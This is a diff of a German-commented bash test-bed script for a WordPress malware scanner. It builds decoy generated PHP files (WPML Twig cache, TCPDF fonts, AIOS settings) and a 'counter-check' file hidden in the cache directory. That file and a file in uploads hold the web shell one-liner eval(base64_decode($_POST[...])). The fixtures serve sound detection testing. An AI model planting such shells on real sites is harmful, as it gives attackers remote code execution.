@@ -474,6 +474,78 @@ PHP
   printf '<?php eval(base64_decode($_POST["c"])); ?>\n' \
     > "${k2}/wp-content/uploads/2026/03/bild.php"
 
+  # ── Erzeugter Code bekannten Formats (7.2, Sichtungsstufe) ──────────
+  # Drei Erzeuger, gemessen am 14.08.2026 auf 282 Treffern: WPML-Twig-Cache
+  # (162), TCPDF-Schriftmetriken (66), Datenablage hinter __halt_compiler()
+  # (8). Zusammen 236 — sie duerfen nicht in die Quarantaene, aber auch nicht
+  # aus dem Bericht.
+  #
+  # Die vierte Datei ist die GEGENPROBE und der eigentliche Test: eine Shell,
+  # die im WPML-Cache-Verzeichnis LIEGT, aber nicht wie ein Twig-Template
+  # AUSSIEHT. Sie muss Quarantaene-Kandidat bleiben. Eine Pfadregel
+  # (*/uploads/cache/wpml/*) haette sie verschwinden lassen — genau deshalb
+  # prueft 7.2 den Inhalt und nicht den Ort.
+  #
+  # Die TCPDF-Datei traegt bewusst die Schreibweise MIT Leerzeichen
+  # ($type = 'cidfont0'). Die erste Fassung der Regel kannte nur die ohne und
+  # liess 4 von 66 Dateien stehen.
+  mkdir -p "${k2}/wp-content/uploads/cache/wpml/twig/3e" \
+           "${k2}/wp-content/uploads/wcj_uploads/tcpdf_fonts" \
+           "${k2}/wp-content/uploads/aios/firewall-rules"
+  #
+  # GROESSE IST TEIL DER FIXTURE. Der erste Entwurf schrieb 145-Byte-Dateien —
+  # die fielen in die Waechterregel darueber (unter 200 Byte, erste Zeile nur
+  # "<?php") und erreichten die Abschichtung nie. Der Prüfstand war gruen und
+  # hat nichts geprueft. Echte Twig-Caches sind 3–10 KB, Schriftmetriken 1–5 KB.
+  {
+    printf '<?php\n\nnamespace WPML\\Core;\n\nuse \\WPML\\Core\\Twig\\Environment;\n'
+    printf 'use \\WPML\\Core\\Twig\\Error\\LoaderError;\nuse \\WPML\\Core\\Twig\\Markup;\n\n'
+    printf 'class __TwigTemplate_pruefstand extends Environment\n{\n'
+    for i in $(seq 1 40); do
+      printf '    protected function block_%02d($context, array $blocks = array()) { echo "%02d"; }\n' "$i" "$i"
+    done
+    printf '}\n'
+  } > "${k2}/wp-content/uploads/cache/wpml/twig/3e/3e63fcbd19fd358f040b36a0ac02099.php"
+  {
+    printf "<?php\n\$type = 'cidfont0';\n\$name = 'STSongStd-Light-Acro';\n"
+    printf "\$displayname = 'STSong Light (Simp. Chinese)';\n"
+    printf "\$desc = array('Ascent' => 752, 'Descent' => -271, 'CapHeight' => 737);\n"
+    printf "\$cw = array(\n"
+    for i in $(seq 1 40); do printf "  %d => 500,\n" "$i"; done
+    printf ");\n"
+  } > "${k2}/wp-content/uploads/wcj_uploads/tcpdf_fonts/stsongstdlight.php"
+  {
+    printf '<?php __halt_compiler();\n'
+    printf '/**\n * This file was created by All In One Security (AIOS) plugin.\n'
+    printf ' * The file is required for storing and retrieving your settings.\n */\n'
+    printf '{"aios_pruefstand":true,"rules":['
+    for i in $(seq 1 20); do printf '{"id":%d,"on":true},' "$i"; done
+    printf '{"id":99,"on":false}]}\n'
+  } > "${k2}/wp-content/uploads/aios/firewall-rules/settings.php"
+  # BEIDE FASSUNGEN MUESSEN UEBER DIE WAECHTERSCHWELLE (200 Byte).
+  #
+  # Der erste Entwurf schrieb 43 bzw. 96 Byte. Unter dem Schalter fiel die
+  # Datei damit in die Waechterregel (klein UND erste Zeile nur "<?php") und
+  # erreichte die Abschichtung nie: der GUARD_COUNT stieg von 6 auf 7, die
+  # Sichtungsliste blieb bei 3. Die Gegenprobe belegte damit den
+  # Waechterfilter statt der Abschichtung — grün, und ohne Aussage.
+  _fuell() { local i; for i in $(seq 1 14); do
+    printf '// Fuellzeile %02d — die Datei muss ueber der Waechterschwelle liegen\n' "$i"; done; }
+  if [[ "${NT_PRUEFSTAND_OHNE_ERZEUGERFILTER:-0}" != "1" ]]; then
+    # Shell IM Cache-Verzeichnis, aber OHNE dessen Format: bleibt Kandidat.
+    { printf '<?php // Pruefstand: liegt im Twig-Cache, traegt dessen Format nicht\n'
+      _fuell
+      printf 'eval(base64_decode($_POST["w"]));\n'
+    } > "${k2}/wp-content/uploads/cache/wpml/twig/3e/getarnt.php"
+  else
+    # Mit Schalter traegt sie den Twig-Kopf: die Abschichtung MUSS sie dann
+    # aufnehmen — und der Vergleich muss das bemerken.
+    { printf '<?php\n\nnamespace WPML\\Core;\n\nuse \\WPML\\Core\\Twig\\Environment;\n'
+      _fuell
+      printf 'eval(base64_decode($_POST["w"]));\n'
+    } > "${k2}/wp-content/uploads/cache/wpml/twig/3e/getarnt.php"
+  fi
+
   # Waechter-Dateien: legitim, duerfen NICHT als Fund erscheinen.
   #
   # Ein Messlauf ueber 68 Installationen meldete 274 leere index.php als
@@ -1574,6 +1646,26 @@ pruefsummen_bauen "$WPSUMMEN" "$BAUM"
 pmf_attrappe_bauen "$PMFAUS" "$BAUM"
 wordfence_attrappe_bauen "$WFDATEN"
 db_attrappe_bauen "$DBDATEN"
+
+# ── Gegenprobe: umbenanntes plugins-Verzeichnis (#65) ────────
+# Der Schalter benennt plugins/ nach plugins-old um — die uebliche
+# Handbewegung, um eine Seite zur Fehlersuche plugin-frei zu starten.
+#
+# e1 prueft `[[ -f "<plugins>/<eintrag>" ]]`. Ohne das Verzeichnis scheitert
+# der Test fuer JEDEN Eintrag, und die Regel meldet die vollstaendige
+# Plugin-Liste als Leichen: ein maximaler Befund aus einem fehlenden
+# Verzeichnis. Auf kundenserver42 waren 18 der 37 gemeldeten Eintraege genau
+# das.
+#
+# Bewusst ein Schalter und keine zusaetzliche Instanz: die DB-Attrappe deckt
+# genau eine Installation ab (`nur`), und sie auf zwei zu erweitern wuerde
+# auch e2 und e3 verdoppeln — mehr Berichtszeilen, kein zusaetzlicher
+# Nachweis. So bleibt die Referenz unberuehrt, und die CI prueft den Fall
+# als SOLL-WERT: das ⚪ muss dastehen, die Leichen-Zeile nicht.
+if [[ "${NT_PRUEFSTAND_OHNE_PLUGINDIR:-0}" == "1" ]]; then
+  _pd="${BAUM}/kunde-zwei.example/httpdocs/wp-content/plugins"
+  [[ -d "$_pd" ]] && mv "$_pd" "${_pd}-old"
+fi
 info "Baum gebaut: $(find "$BAUM" -type f | wc -l | tr -d ' ') Dateien in $(find "$BAUM" -maxdepth 1 -type d | tail -n +2 | wc -l | tr -d ' ') vhosts"
 
 case "$AKTION" in
